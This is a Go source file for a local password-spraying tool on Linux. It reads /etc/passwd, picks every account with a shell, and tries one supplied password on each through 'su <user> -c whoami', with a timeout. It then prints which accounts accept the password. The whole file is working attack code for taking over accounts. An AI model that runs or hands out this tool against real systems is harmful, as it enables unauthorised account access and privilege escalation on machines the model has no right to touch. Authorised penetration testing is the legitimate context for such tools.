// spray_users_lin.go sprays password by attempting to run `whoami`
// as each user with a shell using a given password

package main

import (
	"bufio"
	"bytes"
	"fmt"
	"os"
	"os/exec"
	"strings"
	"syscall"
	"time"
)

func main() {
	if len(os.Args) != 2 {
		fmt.Fprintf(os.Stderr, "[*] Usage: %s <password>\n", os.Args[0])
		os.Exit(1)
	}
	password := os.Args[1]

	file, err := os.Open("/etc/passwd")
	if err != nil {
		fmt.Printf("[-] Error opening /etc/passwd: %v\n", err)
		os.Exit(1)
	}
	defer file.Close()

	var users []string

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := scanner.Text()
		fields := strings.Split(line, ":")
		if len(fields) >= 7 {
			shell := fields[6]
			if strings.HasSuffix(shell, "sh") {
				users = append(users, fields[0])
			}
		}
	}

	if err := scanner.Err(); err != nil {
		fmt.Printf("[-] Error reading /etc/passwd: %v\n", err)
		os.Exit(1)
	}

	for _, user := range users {
		err = runCommandAsUser(user, "whoami", password)
		if err != nil {
			fmt.Printf("[-] Fatal: %s\n", err.Error())
		}
	}
}

func runCommandAsUser(user, command, password string) error {
	cmd := exec.Command("su", user, "-c", command)

	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	cmd.SysProcAttr = &syscall.SysProcAttr{
		Setpgid: true,
	}

	stdin, err := cmd.StdinPipe()
	if err != nil {
		return fmt.Errorf("error obtaining stdin pipe: %w", err)
	}

	err = cmd.Start()
	if err != nil {
		return fmt.Errorf("error starting command: %w", err)
	}

	_, err = stdin.Write([]byte(password + "\n"))
	if err != nil {
		return fmt.Errorf("error writing password to stdin: %w", err)
	}
	stdin.Close()

	timer := time.AfterFunc(2*time.Second, func() {
		syscall.Kill(-cmd.Process.Pid, syscall.SIGKILL)
	})

	err = cmd.Wait()
	timer.Stop()

	if err != nil {
		fmt.Printf("[-] Password didn't work for %s: %v\n", user, err)
	} else {
		fmt.Printf("[+] Password worked for user: %s\n", user)
	}
	return nil
}
